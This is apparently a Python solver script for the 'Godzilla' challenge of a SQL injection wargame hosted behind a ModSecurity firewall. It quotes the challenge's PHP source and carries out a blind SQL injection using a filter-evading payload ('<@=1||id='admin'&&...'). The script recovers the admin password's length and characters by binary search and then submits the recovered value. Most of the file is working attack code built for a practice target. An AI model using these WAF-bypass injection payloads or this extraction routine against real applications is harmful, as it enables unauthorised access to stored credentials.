#!/usr/bin/env python3
import los
import los_cookies as lc


def check_func(*args) -> bool:
    '''
    check string in response of request
    args[0]: response
    '''
    return 'Hello admin' in args[0]


def main():
    '''
    Godzilla 35

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    $query = "select id from prob_godzilla where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']) echo "<h2>Hello admin</h2>";

    $_GET[pw] = addslashes($_GET[pw]);
    $query = "select pw from prob_godzilla where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("godzilla");
    '''

    url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'id'
    other_param = {'pw': 'a'}

    payload = "-1'<@=1||id='admin'&&length(pw)<%s||'"
    p = los.SqlInjection(url, cook, method, inj_param, payload, other_param=other_param)
    len_of_key = p.find_key_len(check_func)

    p.payload = f"-1'<@=1||id='admin'&&ord(mid(pw,%d,1))<%s||'"
    result = p.find_binary(check_func, len_of_key)

    p.payload = result
    p.inj_param = 'pw'
    p.other_param = ''
    response = p.my_request()
    if 'Clear!' in response:
        print('\nGodzilla Clear!')


if __name__ == '__main__':
    main()
